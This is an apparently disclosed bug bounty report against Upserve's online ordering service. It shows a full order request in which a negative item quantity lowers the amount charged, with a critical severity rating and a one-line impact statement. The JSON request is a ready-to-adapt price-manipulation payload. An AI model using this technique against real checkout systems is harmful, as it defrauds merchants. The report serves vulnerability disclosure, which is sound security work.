# OLO Total price manipulation using negative quantities

## Report Details
- **Report ID**: 364843
- **URL**: https://hackerone.com/reports/364843
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-06-11T22:02:17.892Z
- **Disclosed**: 2019-07-06T17:59:06.463Z

## Reporter
- **Username**: fuzz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: upserve

## Vulnerability Information
Manipulating an order request JSON object, containing an additional item with a negative quantity directly manipulates the total amount of the order.

In the following JSON request, an order is submitted for 2 ChickenBurgers ($12 each), as well as -1 BreadPuddings ($9 each).

The total price after tax calculates as $18.70 and is accepted by the system. The attached screenshots show the previous orders, indicating that only $18.70 was charged for the transaction.

```json
{"card_uuid": "09ef096d-18d7-4cb4-83b7-5bd15d310aac", "city": "Cambridge", "email": "mthompson@hexwave.com", "first_name": "Matt", "last_name": "Thompson", "line1": "1230 Massachusetts Ave", "order": {"charges": {"items": [{"item_id": "254baa85-92c1-412e-a391-aaf44508d882", "name": "ChickenBurger", "price": 1200, "quantity": 2, "instructions": "", "total": 1200, "modifiers": [], "sides": []}, {"item_id": "9169bfc1-2ee1-455b-ad65-aeadd36f46eb", "name": "BreadPudding", "price": 900, "quantity": -1, "instructions": "", "total": 900, "modifiers": [], "sides": []}], "taxes": 290, "tip": {"amount": 0}, "total": 1870}, "confirmation_code": "upserve-hacker-cafe-32870", "fulfillment_info": {"customer": {"email": "mthompson@hexwave.com", "first_name": "Matt", "last_name": "Thompson", "phone": "555-555-5555"}, "delivery_info": {"address": {"address_line1": "1230 Massachusetts Ave", "address_line2": null, "city": "Cambridge", "country": "", "state": "MA", "zip_code": "02138"}}, "instructions": "", "type": "delivery"}, "id": "a168f311-f0bf-416c-b813-b277e3a7b5b3", "payments": {"payments": [{"amount": 0, "payment_type": "CREDIT", "tip_amount": 0}], "total": 3190}, "time_placed": "2018-06-11T20:48:51.313Z"}, "order_total": 3190, "phone_number": "555-555-5555", "state": "MA", "store_pretty_url": "upserve-lounge-test-providence-2", "submission_id": "a168f311-f0bf-416c-b813-b277e3a7b5b3", "text_alerts": false, "zip": "02138"}
```

## Impact

The attacker can reduce the price of the order.

## Attachments
- Screen_Shot_2018-06-11_at_2.36.37_PM.png
- Screen_Shot_2018-06-11_at_2.36.48_PM.png
